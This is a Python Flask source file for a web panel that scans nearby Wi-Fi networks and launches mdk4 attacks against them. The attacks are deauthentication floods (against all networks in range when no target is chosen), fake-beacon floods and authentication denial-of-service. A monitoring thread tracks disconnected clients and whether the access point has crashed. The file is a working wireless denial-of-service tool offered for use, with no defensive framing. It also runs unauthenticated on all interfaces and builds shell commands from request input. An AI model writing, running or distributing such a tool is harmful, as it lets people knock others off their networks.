from flask import Flask, render_template, request, jsonify
import subprocess
import os
import time
import signal
import sys
import re
import atexit
import glob
import threading
import tempfile
import json

app = Flask(__name__)

# Variabel global
monitor_iface = None
original_iface = None
attack_process = None
attack_running = False
attack_type = None
current_targets = []
monitor_thread = None
monitor_running = False
monitor_data = {
    "clients": [],
    "ap_status": "unknown",
    "packets_sent": 0,
    "last_update": None
}

# ====================== FUNGSI MANAJEMEN INTERFACE ======================

def find_wireless_interfaces():
    result = subprocess.run(["iwconfig"], capture_output=True, text=True)
    lines = result.stdout.split('\n')
    interfaces = []
    for line in lines:
        if "no wireless extensions" in line:
            continue
        if line.strip() and not line.startswith(" "):
            iface = line.split()[0]
            if iface not in ["lo", "eth0", "eth1"]:
                interfaces.append(iface)
    return interfaces

def is_monitor_mode(iface):
    result = subprocess.run(["iwconfig", iface], capture_output=True, text=True)
    return "Mode:Monitor" in result.stdout

def start_monitor_mode(iface):
    print(f"[*] Starting monitor mode on {iface}...")
    subprocess.run(["sudo", "airmon-ng", "check", "kill"], check=False)
    result = subprocess.run(["sudo", "airmon-ng", "start", iface], capture_output=True, text=True)
    for line in result.stdout.split('\n'):
        if "monitor mode enabled on" in line:
            parts = line.split()
            for i, part in enumerate(parts):
                if part == "on" and i+1 < len(parts):
                    new_iface = parts[i+1].strip()
                    print(f"[+] Monitor interface: {new_iface}")
                    return new_iface
    interfaces = find_wireless_interfaces()
    for i in interfaces:
        if "mon" in i and i != iface:
            print(f"[+] Found monitor interface: {i}")
            return i
    raise RuntimeError("Could not determine monitor interface name")

def stop_monitor_mode(iface):
    if iface:
        print(f"[*] Stopping monitor mode on {iface}...")
        subprocess.run(["sudo", "airmon-ng", "stop", iface], check=False)
    print("[*] Restarting NetworkManager...")
    subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"], check=False)

def ensure_monitor_mode():
    global monitor_iface, original_iface
    interfaces = find_wireless_interfaces()
    for iface in interfaces:
        if is_monitor_mode(iface):
            monitor_iface = iface
            print(f"[+] Found existing monitor interface: {monitor_iface}")
            return monitor_iface
    for iface in interfaces:
        if not is_monitor_mode(iface) and not iface.startswith("mon"):
            original_iface = iface
            try:
                new_iface = start_monitor_mode(iface)
                monitor_iface = new_iface
                print(f"[+] Successfully created monitor interface: {monitor_iface}")
                return monitor_iface
            except Exception as e:
                print(f"[-] Failed to start monitor on {iface}: {e}")
                continue
    raise RuntimeError("No wireless interface available")

def get_monitor_interface():
    global monitor_iface
    if monitor_iface and is_monitor_mode(monitor_iface):
        return monitor_iface
    interfaces = find_wireless_interfaces()
    for iface in interfaces:
        if is_monitor_mode(iface):
            monitor_iface = iface
            return monitor_iface
    return ensure_monitor_mode()

# ====================== PARSE CSV ======================

def parse_csv(filename):
    """Parse airodump-ng CSV output file"""
    networks = []
    clients = []
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
    except FileNotFoundError:
        return networks, clients

    parsing_networks = False
    parsing_clients = False
    
    for line in lines:
        if "bssid" in line.lower() and "channel" in line.lower() and "essid" in line.lower():
            parsing_networks = True
            parsing_clients = False
            continue
        if "station mac" in line.lower():
            parsing_networks = False
            parsing_clients = True
            continue
        if line.strip() == "":
            continue
            
        if parsing_networks:
            parts = line.split(',')
            if len(parts) >= 14:
                bssid = parts[0].strip()
                channel = parts[3].strip()
                essid = parts[13].strip()
                power_str = parts[8].strip() if len(parts) > 8 else ''
                try:
                    power = int(power_str)
                except:
                    power = None
                if bssid and len(bssid) == 17 and ":" in bssid:
                    networks.append({
                        "bssid": bssid,
                        "channel": channel if channel else "?",
                        "essid": essid if essid else "[Hidden]",
                        "power": power
                    })
        
        if parsing_clients:
            parts = line.split(',')
            if len(parts) >= 6:
                bssid = parts[0].strip()
                station = parts[1].strip() if len(parts) > 1 else ""
                power = parts[2].strip() if len(parts) > 2 else ""
                if bssid and len(bssid) == 17 and ":" in bssid:
                    clients.append({
                        "bssid": bssid,
                        "station": station,
                        "power": power
                    })
    
    return networks, clients

def parse_csv_scan(filename):
    """Parse airodump-ng CSV output file untuk scan"""
    networks = []
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
    except FileNotFoundError:
        return networks

    start_parsing = False
    for line in lines:
        if "bssid" in line.lower() and "channel" in line.lower() and "essid" in line.lower():
            start_parsing = True
            continue
        if start_parsing:
            if line.strip() == "" or "station mac" in line.lower():
                break
            parts = line.split(',')
            if len(parts) >= 14:
                bssid = parts[0].strip()
                channel = parts[3].strip()
                essid = parts[13].strip()
                power_str = parts[8].strip() if len(parts) > 8 else ''
                try:
                    power = int(power_str)
                except:
                    power = None
                if bssid and len(bssid) == 17 and ":" in bssid:
                    networks.append({
                        "bssid": bssid,
                        "channel": channel if channel else "?",
                        "essid": essid if essid else "[Hidden]",
                        "power": power
                    })
    return networks

# ====================== MONITORING THREAD ======================

def monitor_loop():
    """Loop monitoring target AP untuk cek client dan status"""
    global monitor_running, monitor_data, monitor_iface
    
    print("[*] Monitoring thread started")
    monitor_running = True
    
    while monitor_running:
        try:
            if not current_targets or not monitor_iface:
                time.sleep(2)
                continue
            
            target = current_targets[0]
            bssid = target['bssid']
            
            temp_file = "/tmp/monitor_output"
            cmd = f"sudo timeout 3 airodump-ng {monitor_iface} --bssid {bssid} -w {temp_file} --output-format csv 2>/dev/null"
            subprocess.run(cmd, shell=True, capture_output=True)
            
            csv_file = f"{temp_file}-01.csv"
            networks = []
            clients = []
            
            if os.path.exists(csv_file):
                networks, clients = parse_csv(csv_file)
                
                monitor_data["clients"] = clients
                monitor_data["ap_status"] = "✅ AP Online" if networks else "⚠️ AP OFFLINE / FREEZE!"
                monitor_data["last_update"] = time.time()
                
                if len(clients) == 0 and monitor_data.get("previous_clients", 0) > 0:
                    print("[Monitor] 🔥 ALL CLIENTS DISCONNECTED! AP mungkin DOWN!")
                elif len(clients) < monitor_data.get("previous_clients", 0):
                    print(f"[Monitor] ⚠️ {monitor_data.get('previous_clients', 0) - len(clients)} client(s) kicked!")
                
                monitor_data["previous_clients"] = len(clients)
                
                try:
                    os.remove(csv_file)
                except:
                    pass
            
            if not networks:
                monitor_data["ap_status"] = "⚠️ AP OFFLINE / FREEZE!"
                print("[Monitor] 🚨 AP TIDAK TERDETEKSI! (FREEZE/CRASH)")
            
        except Exception as e:
            print(f"[-] Monitor error: {e}")
        
        time.sleep(3)

def start_monitor_thread():
    global monitor_thread, monitor_running
    if monitor_thread and monitor_thread.is_alive():
        return
    monitor_running = True
    monitor_thread = threading.Thread(target=monitor_loop)
    monitor_thread.daemon = True
    monitor_thread.start()

def stop_monitor_thread():
    global monitor_running, monitor_thread
    monitor_running = False
    if monitor_thread:
        monitor_thread.join(timeout=2)
        monitor_thread = None

# ====================== ROUTE SCAN ======================

@app.route('/scan', methods=['GET'])
def scan_wifi():
    try:
        interface = get_monitor_interface()
        print(f"[*] Scanning with {interface}...")
        
        for f in glob.glob("/tmp/scan_output*.csv"):
            try:
                os.remove(f)
            except:
                pass
        
        duration = request.args.get('duration', 10, type=int)
        cmd = f"timeout {duration+2} sudo airodump-ng {interface} -w /tmp/scan_output --output-format csv"
        subprocess.run(cmd, shell=True, capture_output=True, text=True)
        
        possible_files = [
            "/tmp/scan_output-01.csv",
            "/tmp/scan_output-02.csv",
            "/tmp/scan_output-03.csv",
            "/tmp/scan_output.csv"
        ]
        
        networks = []
        for f in possible_files:
            if os.path.exists(f):
                networks = parse_csv_scan(f)
                if networks:
                    break
        
        if networks:
            networks.sort(key=lambda x: x['power'] if x['power'] is not None else -1000, reverse=True)
            return jsonify({"status": "success", "networks": networks})
        else:
            return jsonify({"status": "error", "message": "No networks found"})
            
    except Exception as e:
        print(f"[-] Error during scan: {e}")
        return jsonify({"status": "error", "message": str(e)})

# ====================== ROUTES MDK4 ======================

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/interfaces', methods=['GET'])
def get_interfaces():
    try:
        interfaces = find_wireless_interfaces()
        monitor = get_monitor_interface() if interfaces else None
        return jsonify({
            "status": "success",
            "interfaces": interfaces,
            "monitor": monitor
        })
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/monitor_data', methods=['GET'])
def get_monitor_data():
    global monitor_data
    return jsonify({
        "status": "success",
        "data": monitor_data
    })

@app.route('/start_mdk4', methods=['POST'])
def start_mdk4():
    global attack_process, attack_running, attack_type, current_targets
    
    data = request.json
    attack_type = data.get('type')
    targets = data.get('targets', [])
    interface = data.get('interface')
    
    if not interface:
        return jsonify({"status": "error", "message": "No interface selected"})
    
    stop_attack()
    
    cmd = None
    warning_msg = None
    
    if attack_type == 'deauth':
        if targets and len(targets) > 0:
            target_file = tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt')
            try:
                for target in targets:
                    target_file.write(f"{target['bssid']},{target['channel']}\n")
                target_file.close()
                cmd = [
                    "sudo", "mdk4", interface, "d",
                    "-B", target_file.name,
                    "-c", "h",
                    "-s", "500"
                ]
                current_targets = targets
            except Exception as e:
                return jsonify({"status": "error", "message": str(e)})
        else:
            cmd = [
                "sudo", "mdk4", interface, "d",
                "-c", "h",
                "-s", "500"
            ]
            current_targets = []
            
    elif attack_type == 'beacon':
        ssid_file = find_ssid_file()
        if not ssid_file:
            return jsonify({"status": "error", "message": "ssid_list.txt not found in ssid-fake folder"})
        cmd = [
            "sudo", "mdk4", interface, "b",
            "-f", ssid_file,
            "-w", "a",
            "-m",
            "-s", "500"
        ]
        current_targets = []
        
    elif attack_type == 'authdos':
        if targets and len(targets) > 0:
            target = targets[0]
            if len(targets) > 1:
                warning_msg = f"Auth DOS only supports 1 target! Using: {target['essid']} ({target['bssid']})"
                print(f"[!] {warning_msg}")
            
            cmd = [
                "sudo", "mdk4", interface, "a",
                "-a", target['bssid'],
                "-s", "1000"
            ]
            current_targets = [target]
        else:
            return jsonify({"status": "error", "message": "Auth DOS requires 1 target"})
    
    if not cmd:
        return jsonify({"status": "error", "message": "Invalid attack type"})
    
    try:
        print(f"[*] Starting MDK4: {' '.join(cmd)}")
        attack_process = subprocess.Popen(cmd, preexec_fn=os.setsid)
        attack_running = True
        
        if current_targets:
            start_monitor_thread()
        
        response = {
            "status": "success",
            "message": f"MDK4 {attack_type} started",
            "type": attack_type,
            "target_count": len(current_targets)
        }
        
        if warning_msg:
            response["warning"] = warning_msg
            response["ignored"] = len(targets) - 1
        
        return jsonify(response)
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/stop_mdk4', methods=['POST'])
def stop_mdk4():
    try:
        stop_attack()
        return jsonify({"status": "success", "message": "Attack stopped"})
    except Exception as e:
        print(f"[-] Error stopping attack: {e}")
        return jsonify({"status": "error", "message": str(e)})

@app.route('/force_stop', methods=['POST'])
def force_stop():
    """Force stop semua proses"""
    global attack_process, attack_running, monitor_running
    
    try:
        print("[*] Force stopping all processes...")
        
        # Kill semua proses
        subprocess.run("sudo pkill -9 -f mdk4", shell=True, check=False)
        subprocess.run("sudo pkill -9 -f aireplay-ng", shell=True, check=False)
        subprocess.run("sudo pkill -9 -f airodump-ng", shell=True, check=False)
        
        if attack_process:
            try:
                attack_process.kill()
            except:
                pass
            attack_process = None
        
        attack_running = False
        monitor_running = False
        
        # Reset monitor data
        global monitor_data
        monitor_data = {
            "clients": [],
            "ap_status": "unknown",
            "packets_sent": 0,
            "last_update": None
        }
        
        return jsonify({"status": "success", "message": "Force stopped"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

def stop_attack():
    global attack_process, attack_running
    attack_running = False
    if attack_process:
        try:
            os.killpg(os.getpgid(attack_process.pid), signal.SIGTERM)
            attack_process.wait(timeout=2)
        except:
            pass
        attack_process = None
    subprocess.run("sudo pkill -f mdk4", shell=True, check=False)
    
    stop_monitor_thread()
    global monitor_data
    monitor_data = {
        "clients": [],
        "ap_status": "unknown",
        "packets_sent": 0,
        "last_update": None
    }

@app.route('/attack_status', methods=['GET'])
def attack_status():
    global attack_running, attack_type, current_targets
    return jsonify({
        "running": attack_running,
        "type": attack_type,
        "targets": current_targets,
        "target_count": len(current_targets)
    })

def find_ssid_file():
    script_dir = os.path.dirname(os.path.abspath(__file__))
    possible_paths = [
        os.path.join(script_dir, "ssid-fake", "ssid_list.txt"),
        os.path.join(script_dir, "ssid_list.txt"),
    ]
    for path in possible_paths:
        if os.path.exists(path):
            return path
    return None

# ====================== CLEANUP ======================

def cleanup():
    print("\n[*] Cleaning up...")
    stop_attack()
    stop_monitor_thread()
    if monitor_iface:
        stop_monitor_mode(monitor_iface)
    print("[+] Cleanup complete.")

def signal_handler(sig, frame):
    cleanup()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)
atexit.register(cleanup)

# ====================== MAIN ======================

if __name__ == '__main__':
    try:
        ensure_monitor_mode()
        print(f"[*] Monitor interface ready: {monitor_iface}")
        print("[*] Starting Flask server on 0.0.0.0:5000 ...")
        app.run(host='0.0.0.0', port=5000, debug=False)
    except Exception as e:
        print(f"[-] Fatal error: {e}")
        cleanup()
        sys.exit(1)